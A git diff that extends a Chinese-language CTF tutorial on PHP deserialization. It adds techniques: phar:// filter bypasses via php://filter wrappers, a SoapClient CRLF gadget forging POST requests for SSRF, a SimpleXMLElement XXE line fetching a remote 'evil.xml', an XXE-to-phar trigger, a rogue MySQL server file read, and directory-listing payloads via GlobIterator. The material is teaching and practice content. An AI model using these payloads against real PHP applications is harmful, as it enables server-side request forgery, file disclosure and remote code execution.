@@ -279,16 +279,88 @@ file_exists($filename);
 ```
 结果输出：oh oh oh !!! 说明成功进行了反序列化
 
-有时候对传入的参数进行了一些过滤，把 phar:// 开头的直接 过滤了，也就是我要求你要用另外的反序列化的方式，这种方式不能使用 phar:// 开头，我们可以使用的是 compress.zlib://phar://xxxx 这种方式进行绕过过滤
-## **4.4 利用SOAPClient反序列化**
+有时候对传入的参数进行了一些过滤，把 phar:// 开头的直接 过滤了，也就是我要求你要用另外的反序列化的方式，这种方式不能使用 phar:// 开头，我们可以使用的是 compress.zlib://phar://xxxx 这种方式进行绕过过滤。既然是与文件有关的函数均能触发 phar反序列化，那么伪协议呢？
 
-## **4.5 利用SOAPClient反序列化**
+**伪协议读取phar绕过过滤进行反序列化：**<br>
+* php://filter/read=convert.base64-encode/resource=phar://./xx/aaa.phar<br>
+* php://filter/resource=phar://./xx/aaa.phar
+## **4.4 利用SOAPClient反序列化进行SSRF**
+SOAP : Simple Object Access Protocol简单对象访问协议，采用HTTP作为底层通讯协议，XML作为数据传送的格式。
 
+__call方法: https://www.php.net/manual/zh/soapclient.call.php
+
+首先测试下正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法：
+```php
+<?php
+$target = 'http://127.0.0.1:5555/path';
+$post_string = 'data=something';
+$headers = array(
+    'X-Forwarded-For: 127.0.0.1',
+    'Cookie: PHPSESSID=my_session'
+    );
+$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => "aaab"));
+
+$aaa = serialize($b);
+$aaa = str_replace('^^',"\r\n",$aaa);
+$aaa = str_replace('&','&',$aaa);
+echo $aaa;
+
+$c = unserialize($aaa);
+$c->not_exists_function();
+?>
+```
+使用SoapClient反序列化+CRLF可以生成任意POST请求。<br>
+相关CTF练习题目：<br>
+https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload%20Labs%202<br>
+https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php<br>
+## **4.5 利用SimpleXMLElement反序列化进行XXE**
+SimpleXMLElement::__construct:<br>
+https://www.php.net/manual/zh/simplexmlelement.construct.php
+```php
+$exp = new SimpleXMLElement('https://ham.exeye.io/evil.xml',LIBXML_NOENT,True);
+```
+## **4.6 利用XXE反序列化phar**
+```php
+<?php
+error_reporting(0);
+class A{
+	public function __wakeup(){
+		echo "ok";
+	}
+}
+
+$xml = <<<EOF
+<?xml version="1.0"?>
+<!DOCTYPE ANY[
+<!ENTITY file SYSTEM "php://filter/resource=phar://./zend.phar">
+]>
+<x>&file;</x>
+EOF;
+$data = simplexml_load_string($xml);
+```
+## **4.7 利用Rouge Mysql读取phar进行反序列化**
+```php
+// 首先在vps上搭建好Rouge Mysql Server，并指定好要读取的本地文件phar(经过上传或者其他)
+// 根据代码审计构造利用链条，迫使在受害机器上模拟执行mysql客户端连接Rouge Mysql Server
+$m = new mysqli(); 
+$m->init(); 
+$m->real_connect('vps_ip','select 1','select 1','select 1',3306); 
+$m->query('select 1;');
+// mysql客户端读取本地文件phar时候触发反序列化。
+```
+## **4.8 利用内置类Iterator进行实列化读取目录**
+```php
+//GlobIterator 或者  DirectoryIterator
+public GlobIterator::__construct ( string $pattern [, int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ] ) 第一个参数为要搜索的文件名，第二个参数为选择文件的哪个信息作为键名，这里我选择用 FilesystemIterator::CURRENT_AS_FILEINFO ，其对应的常量值为0，你可以在 这里 找到这些常量的值，所以最终搜索文件的 payload 如下：
+http://localhost/CTF/index.php?name=GlobIterator&param=./*.php&param2=0
+或者
+$a=new DirectoryIterator("glob:///*");
+```
 **相关的CTF题**
 
 * LCTF-2018 T4lk 1s ch34p,sh0w m3 the sh31l
 * https://paper.seebug.org/680/
 * http://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/
 # **5 参考文献**
-
-【1】https://blog.spoock.com/2016/10/16/php-serialize-problem/
+【1】https://blog.spoock.com/2016/10/16/php-serialize-problem/<br>
+【2】https://xz.aliyun.com/t/6057<br>
